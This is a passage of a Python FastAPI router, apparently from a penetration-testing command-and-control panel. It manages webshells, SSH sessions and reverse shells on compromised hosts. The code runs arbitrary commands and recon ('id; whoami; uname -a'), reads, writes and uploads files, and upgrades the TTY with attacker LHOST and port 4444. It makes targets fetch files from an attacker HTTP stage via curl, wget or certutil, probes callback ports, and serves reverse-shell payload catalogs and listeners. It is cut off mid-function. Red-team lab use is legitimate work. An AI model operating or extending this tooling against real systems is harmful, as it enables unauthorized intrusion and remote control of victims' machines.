"""Shell 会话：登记(真实连通测试+信息回传) / 执行 / 文件管理 / 终端固化 M1-8 / 出网探测。

所有命令执行与文件读写均经 pivothub/session/ 会话抽象层；本路由层无任何 subprocess。
"""

from __future__ import annotations

import re
from types import SimpleNamespace
from urllib import parse as _uparse

from fastapi import APIRouter, Depends, HTTPException
from fastapi.responses import JSONResponse
from pydantic import BaseModel, Field
from sqlalchemy.orm import Session as DBSession

from ..config import DEFAULT_PROJECT_ID
from ..db import get_attack, get_db, get_session_factory, now
from ..models import Host, ReverseListener, Shell
from ..schemas import HostOut, ShellIn, ShellOut, SshIn
from ..schemas.common import rid
from ..service import add_event
from ..service import filestage as stage_svc
from ..service import reverse_payloads as payload_svc
from ..service import tty as tty_svc
from ..service.probe import run_probes
from ..session import SessionError, get_session
from ..session.reverse import SERVICE as REVERSE_SERVICE, detect_platform
from ..session.ssh import SshSession
from ..ws import manager
from .deps import get_project

router = APIRouter()

#: 反弹 Shell 通道表：shellId -> ReverseShellChannel（进程内，重启即失效）
REVERSE_CHANNELS: dict[str, object] = {}
#: 原始输出订阅表：shellId -> sink（面板终端打开时注册，关闭时注销）
RAW_SINKS: dict[str, object] = {}
#: 启动恢复失败的监听：listenerId -> 错误原因（前端据此提示「重试恢复」）
RESTORE_ERRORS: dict[str, str] = {}


def close_channel(shell_id: str) -> None:
    """关闭并移除某会话的反弹通道与原始推送（删除会话 / 移除资产时调用，避免漏 socket）。"""
    sink = RAW_SINKS.pop(shell_id, None)
    ch = REVERSE_CHANNELS.pop(shell_id, None)
    if ch is None:
        return
    if sink is not None:
        try:
            ch.remove_raw_sink(sink)
        except Exception:
            pass
    try:
        ch.close()
    except Exception:
        pass

INFO_CMD_LINUX = "id; whoami; uname -a; hostname"
INFO_CMD_WINDOWS = "whoami & ver & hostname"


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def _get_shell(db: DBSession, shell_id: str) -> Shell:
    """Shell id 全局唯一：按实体定位（面板当前项目仅约束创建入口）。"""
    s = db.get(Shell, shell_id)
    if not s:
        raise HTTPException(404, f"Shell 不存在: {shell_id}")
    return s


def _open_session(db: DBSession, s: Shell):
    # 反弹 Shell 通道：从进程内通道表取回连通道（不重建 HTTP 会话）
    if getattr(s, "kind", "") == "reverse":
        ch = REVERSE_CHANNELS.get(s.id)
        if ch is None:
            raise SessionError("反弹通道不存在或已断开（请重新监听并让靶机回连）")
        wrap = getattr(s, "escalation_wrapper", "") or ""
        if wrap:
            ch.cmd_wrapper = wrap
        return ch
    host = db.get(Host, s.host_id)
    sess = get_session(s, host)
    if s.stable:
        sess.prefer_pty = True
    sess.timeout = min(getattr(sess, "timeout", 10), 6.0)  # 探针快速失败，避免心跳被死靶拖住
    # 提权上下文：WebShell 无状态，用包装器让后续命令以提权用户执行
    wrap = getattr(s, "escalation_wrapper", "") or ""
    if wrap:
        sess.cmd_wrapper = wrap
    return sess


def _fallback(reason: str, **extra) -> JSONResponse:
    """能力不可用时返回回退标记（不用 5xx：浏览器会记控制台错误）。"""
    body = {"pivothubFallback": True, "reason": reason}
    body.update(extra)
    return JSONResponse(body)


def _stage_host(db: DBSession, project_id: str, shell: Shell, sess) -> str:
    """目标机下载时应访问的攻击机地址（实现见 service.filestage.stage_host，两处共用）。"""
    return stage_svc.stage_host(db, project_id, shell, sess)


def _ensure_reachable(sess) -> None:
    """操作前快速探活：死靶 6s 内失败，避免后续探测逐条等 HTTP 超时。"""
    t = sess.test()
    if not t.ok:
        raise SessionError("目标不可达：" + (t.error or "协议探针无回显"))


# ---------------------------------------------------------------------------
# 登记与连接管理
# ---------------------------------------------------------------------------

def _host_from_url(url: str) -> str:
    """从 WebShell URL 提取主机地址（IP / 域名）；解析不出返回空串。"""
    try:
        return (_uparse.urlparse(url or "").hostname or "").strip().lower()
    except ValueError:
        return ""


@router.post("/shells", response_model=ShellOut)
def add_shell(form: ShellIn, db: DBSession = Depends(get_db)):
    """登记 WebShell：先归属主机，再做真实连通测试 + 基础信息回传。

    归属主机解析顺序（与反弹回连 / SSH 纳管同一策略，任一命中即用）：
    1. 显式 hostId（须属于本项目）
    2. URL 主机地址命中既有主机
    3. 按 URL 主机地址自动创建主机（请人工补充主机名 / 系统 / 层级）
    URL 里也解析不出地址时才拒绝（400，给出可操作提示）。
    """
    project = get_project(db, form.projectId or DEFAULT_PROJECT_ID)

    host = None
    new_host = None
    if form.hostId:
        host = db.get(Host, form.hostId)
        if not host or host.project_id != project.id:
            raise HTTPException(
                404, f"归属主机不存在（hostId={form.hostId}，项目 {project.id}）："
                     "请刷新主机列表后重新选择；或把「归属主机」留空，"
                     "由面板按 URL 中的主机地址自动登记")
    if host is None:
        url_host = _host_from_url(form.url)
        if not url_host:
            raise HTTPException(
                400, "无法确定 Shell 归属主机：未选择「归属主机」，且 URL 中解析不出主机地址"
                     f"（url={form.url!r}）。请选择归属主机，或填写含主机地址的完整 URL"
                     "（如 http://10.10.20.11/upload/shell.php）")
        host = db.query(Host).filter(Host.project_id == project.id, Host.ip == url_host).first()
        if host is None:
            host = Host(
                id=rid("h"), project_id=project.id, ip=url_host, hostname="", os="",
                layer="L1", segment=_seg_of_ip(url_host), privilege="", owned=False,
                ports=[], services=[],
                note="添加 Shell 自动登记（请人工补充主机名 / 系统 / 层级）",
                discovery="WebShell 添加",
            )
            db.add(host)
            db.flush()
            new_host = host
            add_event(db, project.id, "host", f"添加 Shell 自动登记主机 {url_host}",
                      host_id=host.id,
                      detail="添加 Shell 时未选择归属主机：由 URL 地址自动创建，请人工补充信息",
                      push=True)

    s = Shell(
        id=rid("s"), project_id=project.id, host_id=host.id, type=form.type,
        kind=form.kind or "", url=form.url, pwd=form.pass_, encoder=form.encoder,
        alive=False, latency=0, last_beat_at=None, hostname=host.hostname,
        privilege=host.privilege, stable=False,
    )
    db.add(s)
    db.flush()

    # 真实连通性测试 + 基础信息回传入库（M1-5 一期子集）
    collect_detail = ""
    try:
        sess = _open_session(db, s)
        t = sess.test()
        s.alive = t.ok
        s.latency = t.ms if t.ok else 0
        s.last_beat_at = now() if t.ok else None
        if t.ok and form.autoCollect:
            info = sess.exec(INFO_CMD_LINUX if sess.platform == "linux" else INFO_CMD_WINDOWS)
            collect_detail = _collect_host_info(db, host, info.output)
    except SessionError as e:
        s.alive = False
        collect_detail = str(e)

    if host and s.alive:
        host.owned = True

    add_event(db, project.id, "shell",
              (f"登记并连接 Shell：{s.url}" + ("" if s.alive else "（连通性测试失败，已标记断线）")),
              host_id=host.id,
              detail=f"类型 {s.type} · 编码器 {s.encoder} · 延迟 {s.latency}ms"
                     + (f" · {collect_detail}" if collect_detail else ""))
    db.commit()
    if new_host is not None:  # 自动登记的主机实时并入前端主机库（不等下一次整包刷新）
        manager.push("host.found", host=HostOut.of(new_host).model_dump())
    out = ShellOut.of(s)
    manager.push("shell.created", shell=out.model_dump())
    return out


def _collect_host_info(db: DBSession, host: Host, output: str) -> str:
    """解析 id/uname 真实回显 → 更新资产（M1-5 基础信息自动回传）。"""
    parts: list[str] = []
    m = re.search(r"uid=\d+\(([^)]+)\)", output)
    if m:
        host.privilege = m.group(1)
        parts.append(f"whoami={m.group(1)}")
    else:
        # Windows whoami 回显形如 DOMAIN\user（域账号带 $ 结尾的机器账号也覆盖）
        m = re.search(r"^([A-Za-z0-9._-]+)\\([A-Za-z0-9._$-]+)\s*$", output, re.M)
        if m:
            host.privilege = m.group(2)
            parts.append(f"whoami={m.group(2)}")
    m = re.search(r"(Linux [^\r\n]+|Windows[^\r\n]*)", output)
    if m:
        host.os = m.group(1).strip()[:190]
        parts.append("uname=" + host.os)
    if parts:
        add_event(db, host.project_id, "host", "自动回传基础信息并入库", host_id=host.id,
                  detail=" / ".join(parts), push=True)
    return " / ".join(parts)


class TestConnectionIn(BaseModel):
    """「添加 Shell」弹窗的连通性测试入参（dry-run：只探针，不落库）。"""

    type: str = "PHP 一句话马"
    url: str
    pass_: str = Field(default="", alias="pass")
    encoder: str = "base64"


@router.post("/shells/test-connection")
def test_connection(form: TestConnectionIn):
    """保存前的真实连通性测试：按表单临时构造会话探针，**不落库**。

    与登记后的「测试」按钮同走会话层协议探针；失败原因原样带回
    （协议不支持 / HTTP 状态 / 回显缺失分得清），供前端在弹窗内显式展示。
    """
    stub = SimpleNamespace(kind="", type=form.type, url=form.url, pwd=form.pass_,
                           encoder=form.encoder, platform="")
    try:
        sess = get_session(stub)
    except SessionError as e:
        return JSONResponse({"ok": False, "stage": "driver", "error": str(e)})
    except Exception as e:  # 非法 URL 等意外输入：如实带回，不让面板收到 500
        return JSONResponse({"ok": False, "stage": "driver",
                             "error": f"无法按表单构造会话（{type(e).__name__}: {e}）"})
    sess.timeout = 6.0  # 与登记探针一致：快速失败，不死等
    try:
        t = sess.test()
    except SessionError as e:
        return JSONResponse({"ok": False, "stage": "probe", "error": str(e)})
    if not t.ok:
        return {"ok": False, "stage": "probe", "latency": 0,
                "error": t.error or "协议探针无回显（检查 URL / 连接密码 / 编码器是否与目标马一致）"}
    return {"ok": True, "stage": "probe", "latency": t.ms, "driver": getattr(sess, "lang", "")}


@router.post("/shells/{shell_id}/test", response_model=ShellOut)
def test_shell(shell_id: str, db: DBSession = Depends(get_db)):
    """连通性测试：经会话层真实协议探针，延迟落库。"""
    s = _get_shell(db, shell_id)
    project_id = s.project_id
    try:
        sess = _open_session(db, s)
        t = sess.test()
    except SessionError as e:
        s.alive = False
        add_event(db, project_id, "shell", f"Shell 连通性测试失败：{e}", host_id=s.host_id)
        db.commit()
        return ShellOut.of(s)
    s.alive = t.ok
    s.latency = t.ms if t.ok else 0
    s.last_beat_at = now() if t.ok else None
    if t.ok:
        host = db.get(Host, s.host_id)
        if host:
            host.owned = True
        add_event(db, project_id, "shell", f"Shell 连通性正常：{s.url}", host_id=s.host_id,
                  detail=f"协议探针通过 · 延迟 {t.ms}ms")
    else:
        add_event(db, project_id, "shell", f"Shell 连通性测试失败：{t.error}", host_id=s.host_id)
    db.commit()
    # SSH 会话为一次性连接，用完即关，避免占用对端连接数
    if getattr(s, "kind", "") == "ssh":
        try:
            sess.close()
        except Exception:
            pass
    return ShellOut.of(s)


@router.post("/shells/heartbeat")
def heartbeat_all(db: DBSession = Depends(get_db)):
    """全量心跳：对存活 Shell 逐个真实协议探针，结果逐会话经 WS 推送。

    前端列表的绿点 / 延迟 / 最后心跳以这些 shell.beat 帧为准（不再本地伪造抖动）；
    失联会话如实标记断线并在响应中带回 id。
    """
    project = get_project(db, DEFAULT_PROJECT_ID)
    shells = db.query(Shell).filter(Shell.project_id == project.id, Shell.alive.is_(True)).all()
    beat, lost = 0, []
    for s in shells:
        sess = None
        try:
            sess = _open_session(db, s)
            ok = sess.test().ok
        except SessionError:
            ok = False
        finally:
            # SSH 会话为一次性连接，心跳完即关，避免占用对端连接数
            if sess is not None and getattr(s, "kind", "") == "ssh":
                try:
                    sess.close()
                except Exception:
                    pass
        if ok:
            s.last_beat_at = now()
            beat += 1
        else:
            s.alive = False
            lost.append(s.id)
        manager.push("shell.beat", shellId=s.id, alive=ok,
                     latency=s.latency if ok else 0,
                     lastBeat=ShellOut.of(s).lastBeat)
    db.commit()
    return {"beat": beat, "lost": lost}


@router.delete("/shells/{shell_id}")
def remove_shell(shell_id: str, db: DBSession = Depends(get_db)):
    s = _get_shell(db, shell_id)
    project_id = s.project_id
    close_channel(shell_id)  # 反弹通道随会话一起关闭，避免残留 socket
    db.delete(s)
    db.commit()
    return {"deleted": shell_id}


# ---------------------------------------------------------------------------
# 虚拟终端：真实命令执行（M1-3）
# ---------------------------------------------------------------------------

class ExecIn(BaseModel):
    cmd: str
    timeout: float = 15.0


@router.post("/shells/{shell_id}/exec")
def exec_command(shell_id: str, form: ExecIn, db: DBSession = Depends(get_db)):
    s = _get_shell(db, shell_id)
    project_id = s.project_id
    try:
        sess = _open_session(db, s)
    except SessionError as e:
        # 反连通道已断开等：如实标记会话状态，并把原因交给前端显式展示（不静默兜底）
        if getattr(s, "kind", "") == "reverse":
            s.alive = False
            db.commit()
            manager.push("shell.beat", shellId=s.id, alive=False, latency=0,
                         lastBeat=ShellOut.of(s).lastBeat)
        return JSONResponse({"ok": False, "output": "", "error": f"会话不可用：{e}",
                             "ms": 0, "timedOut": False, "stage": "session"})
    try:
        _ensure_reachable(sess)
        res = sess.exec(form.cmd, timeout=form.timeout)
    except SessionError as e:
        if getattr(s, "kind", "") == "reverse":
            s.alive = False
            db.commit()
        # SSH 会话：执行异常时也要关连接，避免泄漏
        if getattr(s, "kind", "") == "ssh":
            try:
                sess.close()
            except Exception:
                pass
        return JSONResponse({"ok": False, "output": "", "error": str(e), "ms": 0,
                             "timedOut": False, "stage": "exec"})
    s.last_beat_at = now()
    db.commit()
    # SSH 会话为一次性连接，用完即关，避免占用对端连接数
    if getattr(s, "kind", "") == "ssh":
        try:
            sess.close()
        except Exception:
            pass
    return {
        "ok": res.ok, "output": res.output, "error": res.error,
        "ms": res.ms, "timedOut": res.timed_out,
    }


# ---------------------------------------------------------------------------
# 交互能力检测 / 终端固化 / 收尾（M1-8，P0）
# ---------------------------------------------------------------------------

@router.post("/shells/{shell_id}/tty/detect")
def tty_detect(shell_id: str, db: DBSession = Depends(get_db)):
    """交互能力检测：真实执行 tty / echo $TERM / stty size / 工具探测并解析。"""
    s = _get_shell(db, shell_id)
    project_id = s.project_id
    try:
        sess = _open_session(db, s)
    except SessionError as e:
        return _fallback(f"会话不可用：{e}")
    try:
        _ensure_reachable(sess)
        result = tty_svc.detect(sess)
    except SessionError as e:
        # 死靶：诚实返回不可达结论（不做假动画，不慢慢超时）
        result = {
            "caps": {"os": sess.platform}, "mode": "dumb", "probeLines": [],
            "summary": f"检测结论：目标不可达（{e}）",
        }
    mode = result["mode"]
    if mode == "full":
        s.stable = True
        s.alive = True
        manager.push("shell.tty", shellId=s.id, mode=mode, hasPty=True)

    def _label(m: str) -> str:
        """终端形态文案：反弹通道本身是原始交互通道，不能笼统写「WebShell 伪终端」。"""
        if m == "full":
            return "已固化（交互 TTY）"
        if getattr(s, "kind", "") == "reverse":
            return "交互通道（反弹，未固化 PTY）"
        return "半交互（无 TTY / 无 job control）" if m == "semi" else "未固化（WebShell 伪终端）"

    db.commit()
    add_event(db, project_id, "shell", "终端交互能力检测：" + _label(mode),
              host_id=s.host_id, detail=result["summary"])
    db.commit()
    result["modeLabel"] = _label(mode)
    result["sessionKind"] = getattr(s, "kind", "")
    return result


@router.post("/shells/{shell_id}/tty/upgrade")
def tty_upgrade(shell_id: str, form: dict, db: DBSession = Depends(get_db)):
    """执行固化技法，依据 PTY 内真实回显判定（M1-8 核心）。"""
    s = _get_shell(db, shell_id)
    project_id = s.project_id
    fix_id = (form or {}).get("fixId", "")
    from ..db import load_plugin_dir

    fix = next((f for f in load_plugin_dir("tty_fixes") if f.get("id") == fix_id), None)
    if not fix:
        raise HTTPException(404, f"固化技法不存在: {fix_id}")
    try:
        sess = _open_session(db, s)
    except SessionError as e:
        return _fallback(f"会话不可用：{e}")
    try:
        _ensure_reachable(sess)
        # 技法命令里的攻击机地址/端口按项目配置渲染（缺省 4444 = 反弹页默认监听端口）
        from ..db import get_attack

        lhost = str((get_attack(db, project_id) or {}).get("ip") or "127.0.0.1")
        result = tty_svc.upgrade(sess, fix, lhost=lhost, lport=4444)
    except SessionError as e:
        result = {"hasPty": False, "reason": str(e), "summary": "目标不可达，技法未执行"}

    if result.get("hasPty"):
        s.stable = True
        s.alive = True
        sess.prefer_pty = True
        first_cmd = (fix.get("cmd") or "").splitlines()[0][:200] if fix.get("cmd") else ""
        add_event(db, project_id, "shell", f"终端固化为交互 TTY：{fix.get('name')}",
                  host_id=s.host_id, cmd=first_cmd,
                  detail=f"技法 {fix.get('name')} · 可靠性 {fix.get('reliability')}% · "
                         f"PTY={result.get('tty')} · TERM={result.get('term')} · "
                         f"窗口={result.get('sttySize')} · 会话 {s.id}")
        manager.push("shell.tty", shellId=s.id, mode="full", hasPty=True,
                     term=result.get("term", ""))
    db.commit()
    return result


class FinishIn(BaseModel):
    rows: int = 40
    cols: int = 120


@router.post("/shells/{shell_id}/tty/finish")
def tty_finish(shell_id: str, form: FinishIn | None = None, db: DBSession = Depends(get_db)):
    """收尾：真实执行 stty sane + rows/cols 同步 + TERM 修正，回读验证。"""
    s = _get_shell(db, shell_id)
    project_id = s.project_id
    body = form or FinishIn()
    try:
        sess = _open_session(db, s)
    except SessionError as e:
        return _fallback(f"会话不可用：{e}")
    try:
        _ensure_reachable(sess)
        result = tty_svc.finish(sess, rows=body.rows, cols=body.cols)
    except SessionError as e:
        result = {"ok": False, "reason": str(e), "summary": f"目标不可达：{e}"}
    if result.get("ok"):
        s.stable = True
        add_event(db, project_id, "shell", "终端收尾完成（stty sane + rows/cols 同步）",
                  host_id=s.host_id, detail=result.get("summary", ""))
        manager.push("shell.tty", shellId=s.id, mode="full", hasPty=True,
                     term=result.get("term", ""))
    db.commit()
    return result


# ---------------------------------------------------------------------------
# 文件管理（M1-4）：浏览 / 读取 / 写入 / 上传
# ---------------------------------------------------------------------------

def _safe_path(p: str) -> str:
    return (p or "/").strip() or "/"


@router.get("/shells/{shell_id}/files")
def files_list(shell_id: str, path: str = "/", db: DBSession = Depends(get_db)):
    s = _get_shell(db, shell_id)
    project_id = s.project_id
    try:
        sess = _open_session(db, s)
        entries = sess.list_dir(_safe_path(path))
    except SessionError as e:
        return _fallback(f"列目录失败：{e}")
    # . / .. 由前端面包屑负责导航，不当作条目下发
    entries = [e for e in entries if e.name not in (".", "..")]
    return {
        "cwd": _safe_path(path),
        "entries": [e.to_contract() for e in
                    sorted(entries, key=lambda x: (not x.is_dir, x.name.lower()))],
    }


@router.get("/shells/{shell_id}/files/content")
def files_read(shell_id: str, path: str, db: DBSession = Depends(get_db)):
    s = _get_shell(db, shell_id)
    project_id = s.project_id
    try:
        sess = _open_session(db, s)
        content = sess.read_file(_safe_path(path))
    except SessionError as e:
        raise HTTPException(422, f"读取失败：{e}")
    return {"path": _safe_path(path), "name": path.rstrip("/").rsplit("/", 1)[-1],
            "content": content}


class WriteIn(BaseModel):
    path: str
    content: str


@router.post("/shells/{shell_id}/files/write")
def files_write(shell_id: str, form: WriteIn, db: DBSession = Depends(get_db)):
    s = _get_shell(db, shell_id)
    project_id = s.project_id
    try:
        sess = _open_session(db, s)
        sess.write_file(_safe_path(form.path), form.content)
    except SessionError as e:
        raise HTTPException(422, f"写入失败：{e}")
    add_event(db, project_id, "shell", f"在线编辑写入 {form.path}", host_id=s.host_id,
              detail=f"{len(form.content)} 字节")
    db.commit()
    return {"ok": True, "path": form.path}


class UploadIn(BaseModel):
    path: str
    name: str
    contentB64: str


@router.post("/shells/{shell_id}/files/upload")
def files_upload(shell_id: str, form: UploadIn, db: DBSession = Depends(get_db)):
    import base64

    s = _get_shell(db, shell_id)
    project_id = s.project_id
    try:
        data = base64.b64decode(form.contentB64)
    except Exception as e:
        raise HTTPException(400, f"base64 解码失败: {e}")
    target = form.path.rstrip("/") + "/" + form.name
    try:
        sess = _open_session(db, s)
        size = sess.upload_file(_safe_path(target), data)  # 二进制安全（分块 base64 / 原始流）
    except SessionError as e:
        return _fallback(f"上传失败：{e}")
    add_event(db, project_id, "shell", f"上传文件 {form.name}", host_id=s.host_id,
              detail=f"目标路径 {target} · {size} 字节")
    db.commit()
    return {"ok": True, "path": target, "size": size}


# ---------------------------------------------------------------------------
# HTTP 拉取上传：攻击机起临时 HTTP 服务 → 目标机用 curl/wget 等自取
# ---------------------------------------------------------------------------

class PullIn(BaseModel):
    """上传「HTTP 拉取」通道入参（contentB64 与分片上传同一契约）。"""

    path: str
    name: str
    contentB64: str
    host: str = ""       # 目标机应访问的攻击机地址；空 = 项目攻击机网络 / 回环
    port: int = 0        # 暂存服务端口；空 = 当前实例端口
    tool: str = ""       # 强制指定下载工具；空 = 自动探测后逐个尝试
    timeout: float = 0.0  # 单次下载超时秒数；0 = 300


@router.get("/shells/{shell_id}/files/pull/tools")
def files_pull_tools(shell_id: str, db: DBSession = Depends(get_db)):
    """目标侧真实探测可用下载工具（curl/wget/python3/certutil/...）。"""
    s = _get_shell(db, shell_id)
    try:
        sess = _open_session(db, s)
    except SessionError as e:
        return _fallback(f"下载工具探测失败：{e}")
    tools = stage_svc.detect_tools(sess)
    platform = getattr(sess, "platform", "linux")
    return {
        "ok": True,
        "platform": platform,
        "tools": [{"key": t, "label": stage_svc.TOOL_LABELS.get(t, t)} for t in tools],
        "cmd": stage_svc.DETECT_CMDS["windows" if platform == "windows" else "linux"],
    }


@router.post("/shells/{shell_id}/files/pull")
def files_pull(shell_id: str, form: PullIn, db: DBSession = Depends(get_db)):
    """把文件暂存在攻击机 HTTP 服务上，由目标机主动下载并按字节数校验。"""
    import base64

    s = _get_shell(db, shell_id)
    project_id = s.project_id
    try:
        data = base64.b64decode(form.contentB64)
    except Exception as e:
        raise HTTPException(400, f"base64 解码失败: {e}")
    target = form.path.rstrip("/") + "/" + form.name
    item = None
    url = ""
    try:
        sess = _open_session(db, s)
        platform = getattr(sess, "platform", "linux")
        item = stage_svc.STAGE.add(form.name, data)
        port = form.port or stage_svc.STAGE.bound_port
        primary = form.host.strip() or _stage_host(db, project_id, s, sess)
        # 可达性预检：目标连不到就不必逐个下载工具长超时（certutil/Invoke-WebRequest 无超时参数）；
        # 项目攻击机地址不可达时回退回环（同机联调 / 端口转发靶场）。
        candidates = [h for h in dict.fromkeys([primary, "127.0.0.1"]) if h]
        host = next((h for h in candidates if stage_svc.can_reach(sess, h, port)), "")
        if not host:
            return _fallback(f"目标机连不到攻击机 {primary}:{port}（出站受限 / 网段不通）："
                             "请确认「全局设置」里的攻击机地址，或改走分片直传", platform=platform)
        logs = []
        if host != primary:
            logs.append(f"[http] 攻击机地址 {primary} 不可达，回退用 {host}")
        url = f"http://{host}:{port}/s/{item.token}/{item.name}"
        tools = [form.tool] if form.tool else stage_svc.detect_tools(sess)
        result = stage_svc.pull_file(
            sess, url, _safe_path(target), len(data),
            platform=platform, tools=tools, timeout=form.timeout or 300.0,
            per_timeout=form.timeout or 300.0,
        )
        result.log[:0] = logs
    except SessionError as e:
        return _fallback(f"HTTP 拉取失败：{e}")
    finally:
        # 拉取结果已定（成功或全部工具失败）后立即撤下暂存条目，不留暴露面
        if item is not None:
            stage_svc.STAGE.drop(item.token)
    if not result.ok:
        return _fallback(result.reason, log=result.log, url=url, platform=platform)
    add_event(db, project_id, "shell", f"上传文件 {form.name}", host_id=s.host_id,
              detail=f"HTTP 拉取（{result.tool}）· 目标路径 {target} · {result.size} 字节")
    db.commit()
    return {"ok": True, "path": target, "size": result.size, "tool": result.tool,
            "url": url, "cmd": result.cmd, "log": result.log}


# ---------------------------------------------------------------------------
# 出网探测（M2 出网探测）：经会话层真实执行 ICMP / DNS / HTTP / TCP
# ---------------------------------------------------------------------------

class ProbeIn(BaseModel):
    """探测目标可覆盖（缺省用内置基线）。

    attackIp/attackPort 有值时，ICMP/HTTP/TCP 直接探攻击机——操作者真正关心的是
    「目标能不能回连到我这条隧道端口」，而不是「能不能上公网」。
    """

    icmpHost: str = ""
    dnsName: str = ""
    httpUrl: str = ""
    tcpHost: str = ""
    tcpPort: int = 0
    attackIp: str = ""
    attackPort: int = 0


@router.post("/shells/{shell_id}/probe")
def shell_probe(shell_id: str, form: ProbeIn | None = None, db: DBSession = Depends(get_db)):
    """真实执行四类出网探针，解析真实回显 → verdict/recommend/alt/reason。

    逐探针 WS 推送 probe.result；结论入时间线（前端「出网探测」弹窗消费）。
    未显式给 attackIp 时取项目「攻击机网络」配置，保证探针回答的是回连路径问题。
    """
    from ..db import get_attack

    s = _get_shell(db, shell_id)
    host = db.get(Host, s.host_id)
    try:
        sess = _open_session(db, s)
        _ensure_reachable(sess)
    except SessionError as e:
        return JSONResponse({"ok": False, "stage": "reachable", "error": str(e),
                             "verdict": "", "recommend": "", "alt": "",
                             "reason": f"探测未执行：{e}", "probes": []})

    opts = {k: v for k, v in (form.model_dump() if form else {}).items() if v}
    if not opts.get("attackIp"):
        try:
            opts["attackIp"] = str(get_attack(db, s.project_id).get("ip") or "")
        except Exception:  # pragma: no cover - 配置缺失按公网基线探测
            opts["attackIp"] = ""
    report = run_probes(sess, host_id=s.host_id, opts=opts)

    for p in report.probes:
        manager.push("probe.result", hostId=s.host_id, probe=p.key,
                     ok=(p.state == "ok"), ms=p.ms, evidence=p.evidence, cmd=p.cmd)

    detail = (f"推荐 {report.recommend}" + (f" · 备选 {report.alt}" if report.alt else "")
              + " · 证据 " + "; ".join(f"{p.key}={p.state}" for p in report.probes))
    if report.warning:
        detail = detail + " · " + report.warning
    add_event(db, s.project_id, "proxy", f"出网探测完成：{report.verdict}",
              host_id=s.host_id, detail=detail)
    db.commit()
    out = report.to_dict()
    out["ok"] = True
    return out


class CallbackMatrixIn(BaseModel):
    """回连端口矩阵：attackIp 留空时取全局设置的攻击机 IP（所有回连命令的唯一来源）。"""

    attackIp: str = ""
    ports: list[int] = []
    timeout: float = 8.0


@router.post("/shells/{shell_id}/probe/callback")
def shell_probe_callback(shell_id: str, form: CallbackMatrixIn | None = None,
                         db: DBSession = Depends(get_db)):
    """【A4】对攻击机逐端口实测出站可达性 → 直接回答「哪个端口能回连」。

    四探针回答的是"能不能上公网"；这里回答的是"我这条回连路径到底通不通"，
    结论中的端口可直接填进隧道服务端监听端口。
    """
    from ..db import get_attack
    from ..service.probe import run_callback_matrix

    s = _get_shell(db, shell_id)
    host = db.get(Host, s.host_id)
    attack_ip = (form.attackIp if form else "") or ""
    if not attack_ip:
        try:
            attack_ip = str(get_attack(db, s.project_id).get("ip") or "")
        except Exception:
            attack_ip = ""
    try:
        sess = _open_session(db, s)
        _ensure_reachable(sess)
    except SessionError as e:
        return JSONResponse({"ok": False, "stage": "reachable", "error": str(e),
                             "verdict": "", "recommend": "", "alt": "",
                             "reason": f"探测未执行：{e}", "probes": []})

    report = run_callback_matrix(
        sess, attack_ip=attack_ip, host_id=s.host_id,
        ports=(form.ports if form and form.ports else None),
        per_timeout=float(form.timeout if form else 8.0) or 8.0,
    )
    for p in report.probes:
        manager.push("probe.result", hostId=s.host_id, probe=p.key,
                     ok=(p.state == "ok"), ms=p.ms, evidence=p.evidence, cmd=p.cmd)
    add_event(db, s.project_id, "proxy", f"回连端口矩阵：{report.verdict}",
              host_id=s.host_id,
              detail=f"推荐 {report.recommend} · 对端 {attack_ip} · 证据 "
                     + "; ".join(f"{p.key}={p.state}" for p in report.probes))
    db.commit()
    out = report.to_dict()
    out["ok"] = True
    out["attackIp"] = attack_ip
    return out


# ---------------------------------------------------------------------------
# 反弹 Shell 通道（会话层 reverse 驱动）：监听 → 靶机回连 → 登记会话
# ---------------------------------------------------------------------------

def _tools_of(tools: str) -> set | None:
    """`tools=bash,nc,perl` → 集合；空串 → None（未知，不做可用性标注）。"""
    items = {t.strip() for t in (tools or "").split(",") if t.strip()}
    return items or None


@router.get("/shells/reverse/payloads")
def reverse_payload_catalog(ip: str = "", port: int = 0, platform: str = "", tools: str = ""):
    """反弹载荷目录：语法 × 编码 × 平台，按 ip/port 渲染并标注目标可用性。

    tools 来自目标真实探测（见返回的 probeCmd：`command -v …` 输出 PIVOTHUB_HAVE:<tool>），
    缺工具的组合会带 available=false / missing=[…]，前端据此提示而不是下发后失败。
    """
    return payload_svc.catalog(ip=ip, port=port, platform=platform, tools=_tools_of(tools))


@router.get("/shells/reverse/payload")
def reverse_payload_render(id: str = "", encode: str = "raw", ip: str = "", port: int = 0,
                           background: bool = True, tools: str = ""):
    """渲染单条载荷（语法 id × 编码 encode × 后台包装），供前端实时预览/下发。"""
    try:
        return payload_svc.render(id, ip, port, encode,
                                  background=background, tools=_tools_of(tools))
    except SessionError as e:
        return JSONResponse({"ok": False, "stage": "render", "error": str(e)})


class ReverseListenIn(BaseModel):
    """开监听：bind 缺省 127.0.0.1（合规）；真实靶场回连攻击机 VPN 地址时显式传该地址。"""

    bind: str = "127.0.0.1"
    port: int
    label: str = ""
    #: 监听后阻塞等待回连的秒数（0 = 不等待，仅开监听）
    waitS: float = 0.0
    #: 同地址端口已有「未回连」的监听时是否自动替换（休眠/断线后的残留监听会占住端口）
    replacePending: bool = True


class ReverseRegisterIn(BaseModel):
    """把已回连通道登记为会话。

    ⚠️ 修正：hostId **不再必填**。原先无 WebShell 前置（纯 RCE → 直接反弹）时
    前端传 hostId='' → 后端 `db.get(Host,'')` 为 None → 抛 404「主机不存在」，
    而前端 api.js 把 404 抹成「HTTP 404 /api/shells/reverse/register」，看起来
    像接口缺失。现在改为：hostId → 同 IP 既有主机 → hostIp → **回连对端 IP 自动建主机**。
    """

    projectId: str = ""
    listenerId: str
    hostId: str = ""
    hostIp: str = ""
    type: str = "反弹 Shell（/dev/tcp）"
    autoCollect: bool = True


def _seg_of_ip(ip: str) -> str:
    """由 IP 推 /24 网段（避免与 api.hosts 相互 import）。"""
    parts = (ip or "").split(".")
    return ".".join(parts[:3]) + ".0/24" if len(parts) == 4 else ""


@router.post("/shells/reverse/listen")
def reverse_listen(form: ReverseListenIn):
    """在攻击机侧开启反弹监听（真实 socket，仅监听显式地址）。

    地址校验：非回环地址必须是**本机当前真实拥有的地址**——休眠 / 换网后旧 IP 会失效，
    直接 bind 会得到 WinError 10049，这里提前给出可操作提示。
    """
    bind = (form.bind or "127.0.0.1").strip()
    if bind not in ("127.0.0.1", "localhost"):
        from .attack import _local_ipv4

        local_ips = _local_ipv4()
        if bind not in local_ips:
            return JSONResponse({
                "ok": False, "stage": "bind",
                "error": f"本机当前没有地址 {bind}（休眠 / 换网后 IP 可能变了），请重新检测本机 IP",
                "localIps": local_ips,
            })
    try:
